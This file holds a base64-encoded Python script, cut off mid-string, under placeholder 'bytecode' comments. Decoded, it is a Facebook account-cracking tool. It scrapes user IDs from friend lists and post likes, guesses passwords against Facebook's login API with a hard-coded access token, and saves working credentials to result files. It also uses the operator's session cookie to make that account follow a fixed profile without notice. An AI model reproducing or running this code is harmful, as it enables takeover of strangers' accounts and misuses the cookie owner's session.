#example b'\xe3\x00\x00\x00\x00\x00\'
py3='Bytes code here'

#example 'c\xe3\x00\x00\x00\x00\x00\'
py2='IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQojIGNvZGVkIGJ5IGFuYmlhCmltcG9ydCBvcwppbXBvcnQgcmUgCmltcG9ydCB0aW1lCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmZyb20gbGliIGltcG9ydCBsb2dvCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcgpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCm1iYXNpYyA9ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb217fScKZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsIGNvdW50CgppZCA9IFtdCmRpZSA9IDAKY2hlayA9IFtdCmxpZmUgPSBbXQpjb3VudCA9IDAKY2hlY2sgPSAwCnJlc3VsdCA9IDAKCmcgPSAnXHgxYlsxOzMybScKdyA9ICdceDFiWzE7MzdtJwpiID0gJ1x4MWJbMTszNm0nCnIgPSAnXHgxYlsxOzMxbScKCmRlZiBtYXN1aygpOgogICAgICAgIGxvZ28uYmFubmVyKCkKICAgICAgICBwcmludCgnXG5cblx0XHTiibogXDAzM1sxOzM2bUZBQ0VCT09LIExPR0lOXDAzM1swbSDiibtcblxuJykKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJjb29raWVzIikucmVhZCgpCiAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgY2VrID0gaW5wdXQoIltcMDMzWzE7MzJtPlwwMzNbMG0gRW50ZXIgQ29va2llIDogIikKICAgICAgICBjZWsgPSB7ImNvb2tpZSI6Y2VrfQogICAgICAgIGlzbWkgPSBzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoIi9tZSIsdmVyaWZ5PUZhbHNlKSxjb29raWVzPWNlaykuY29udGVudAogICAgICAgIGlmICJtYmFzaWNfbG9nb3V0X2J1dHRvbiIgaW4gc3RyKGlzbWkpOgogICAgICAgICAgICAgICAgaWYgIkFwYSB5YW5nIEFuZGEgcGlraXJrYW4gc2VrYXJhbmciIGluIHN0cihpc21pKToKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCJjb29raWVzIiwidyIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShjZWtbImNvb2tpZSJdKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiMgQ2hhbmdlIHRoZSBsYW5ndWFnZSwgcGxlYXNlIHdhaXQhISIpCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5nZXQobWJhc2ljLmZvcm1hdChwYXJzZXIoaXNtaSwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkJhaGFzYSBJbmRvbmVzaWEiKVsiaHJlZiJdKSxjb29raWVzPWNlaykKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgIyBwbGVhc2UgZG9uJ3QgcmVtb3ZlIHRoaXMgb3IgY2hhbmdlCiAgICAgICAgICAgICAgICAgICAgICAgIGlrdXRpID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KCIvYW5iaWEuc2FucyIpLGNvb2tpZXM9Y2VrKS5jb250ZW50LCJodG1sLnBhcnNlciIpLmZpbmQoImEiLHN0cmluZz0iSWt1dGkiKVsiaHJlZiJdCiAgICAgICAgICAgICAgICAgICAgICAgIHNlcy5nZXQobWJhc2ljLmZvcm1hdChpa3V0aSksY29va2llcz1jZWspCiAgICAgICAgICAgICAgICBleGNlcHQgOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzIAogICAgICAgICAgICAgICAgcmV0dXJuIGNla1siY29va2llIl0KICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgIGV4aXQoIiMgY29va2llcyBpbnZhbGlkIikKZGVmIGxvZ2luKHVzZXJuYW1lLHBhc3N3b3JkLGNlaz1GYWxzZSk6CiAgICAgICAgZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsY291bnQKICAgICAgICBiID0gIjM1MDY4NTUzMTcyOCU3QzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyIgogICAgICAgIHBhcmFtcyA9IHsKICAgICAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiBiLAogICAgICAgICAgICAgICAgJ2Zvcm1hdCc6ICdKU09OJywKICAgICAgICAgICAgICAgICdzZGtfdmVyc2lvbic6ICcyJywKICAgICAgICAgICAgICAgICdlbWFpbCc6IHVzZXJuYW1lLAogICAgICAgICAgICAgICAgJ2xvY2FsZSc6ICdlbl9VUycsCiAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwKICAgICAgICAgICAgICAgICdzZGsnOiAnaW9zJywKICAgICAgICAgICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsCiAgICAgICAgICAgICAgICAnc2lnJzogJzNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JywKICAgICAgICB9CiAgICAgICAgYXBpID0gJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luJwogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGFwaSwgcGFyYW1zPXBhcmFtcykKICAgICAgICBpZiAnRUFBJyBpbiByZXNwb25zZS50ZXh0OgogICAgICAgICAgICAgICAgcHJpbnQoZiJccltcMDMzWzE7MzJtTElGRVwwMzNbMG1dIHt1c2VybmFtZX0gPT4ge3Bhc3N3b3JkfSAgICAgICAgICAgICAgICAgICAgICAgIixlbmQ9IiIpCiAgICAgICAgICAgICAgICBwcmludCgpCiAgICAgICAgICAgICAgICByZXN1bHQgKz0gMQogICAgICAgICAgICAgICAgaWYgY2VrOgogICAgICAgICAgICAgICAgICAgICAgICBsaWZlLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtbGlmZS50eHQnLCdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHVzZXJuYW1lICsgJ3wnICsgcGFzc3dvcmQgKyAnXG4nKQogICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlc3BvbnNlLmpzb24oKVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICBwcmludChmIlxyW1wwMzNbMTs5MW1DSEVLXDAzM1swbV0ge3VzZXJuYW1lfSA9PiB7cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikKICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgIGNoZWNrICs9IDEKICAgICAgICAgICAgICAgIGlmIGNlazoKICAgICAgICAgICAgICAgICAgICAgICAgY2hlay5hcHBlbmQodXNlcm5hbWUrInwiK3Bhc3N3b3JkKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWNoZWNrLnR4dCcsJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRpZSArPSAxCiAgICAgICAgZm9yIGkgaW4gbGlzdCgnXHwvLeKAoicpOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxyW3tpfV0gTGlmZSA6ICh7c3RyKHJlc3VsdCl9KSBjaGVja3BvaW50IDogKHtzdHIoY2hlY2spfSkgZGllIDogKHtzdHIoZGllKX0pIixlbmQ9IiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4yKQpkZWYgZ2V0aWQodXJsKToKICAgICAgICByYXcgPSByZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9a3VraSkuY29udGVudAogICAgICAgIGdldHVzZXIgPSByZS5maW5kYWxsKCdtaWRkbGUiPjxhIGNsYXNzPSIuLiIgaHJlZj0iKC4qPykiPiguKj8pPC9hPicsc3RyKHJhdykpCiAgICAgICAgZm9yIHggaW4gZ2V0dXNlcjoKICAgICAgICAgICAgICAgIGlmICdwcm9maWxlJyBpbiB4WzBdOgogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHJlLmZpbmRhbGwoIj0oXGQqKT8iLHN0cih4WzBdKSlbMF0pCiAgICAgICAgICAgICAgICBlbGlmICdmcmllbmRzJyBpbiB4OgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHhbMV0gKyAnfCcgKyB4WzBdLnNwbGl0KCcvJylbMV0uc3BsaXQoJz8nKVswXSkKICAgICAgICAgICAgICAgIHByaW50KCdcciMgJyArIHN0cihsZW4oaWQpKSArICIgcmV0cmlldmVkIixlbmQ9IiIpCiAgICAgICAgaWYgJ0xpaGF0IFRlbWFuIExhaW4nIGluIHN0cihyYXcpOgogICAgICAgICAgICAgICAgZ2V0aWQobWJhc2ljLmZvcm1hdChwYXJzZXIocmF3LCdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLHN0cmluZz0nTGloYXQgVGVtYW4gTGFpbicpWydocmVmJ10pKQogICAgICAgIHJldHVybiBpZApkZWYgZnJvbWxpa2VzKHVybCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbGlrZSA9IHJlcXVlc3RzLmdldCh1cmwsY29va2llcz1rdWtpKS5jb250ZW50CiAgICAgICAgICAgICAgICBsb3ZlID0gcmUuZmluZGFsbCgnaHJlZj0iKC91ZmkuKj8pIicsc3RyKGxpa2UpKVswXQogICAgICAgICAgICAgICAgYXdzID0gZ2V0bGlrZShtYmFzaWMuZm9ybWF0KGxvdmUpKQogICAgICAgICAgICAgICAgcmV0dXJuIGF3cwogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGV4aXQoIiMgY2FudCBkdW1wIGlkICIpCmRlZiBnZXRsaWtlKHJlYWN0KToKICAgICAgICBsaWtlID0gcmVxdWVzdHMuZ2V0KHJlYWN0LGNvb2tpZXM9a3VraSkuY29udGVudAogICAgICAgIGlkcyAgPSByZS5maW5kYWxsKCdjbGFzcz0iYi4iPjxhIGhyZWY9IiguKj8pIj4oLio'
